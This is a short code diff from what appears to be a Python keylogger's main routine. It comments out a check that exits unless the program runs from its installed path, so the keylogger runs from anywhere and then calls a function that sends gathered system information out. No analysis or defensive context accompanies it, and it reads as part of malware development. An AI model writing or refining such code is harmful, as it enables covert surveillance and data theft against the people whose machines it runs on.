@@ -228,8 +228,8 @@ if __name__ == "__main__":
             sys.exit(0)
 
     # Run the keylogger if it's installed
-    if os.path.abspath(sys.executable) != os.path.abspath(APP_PATH):
-        sys.exit(0)
+    # if os.path.abspath(sys.executable) != os.path.abspath(APP_PATH):
+    #     sys.exit(0)
 
     send_data(get_system_info())
 
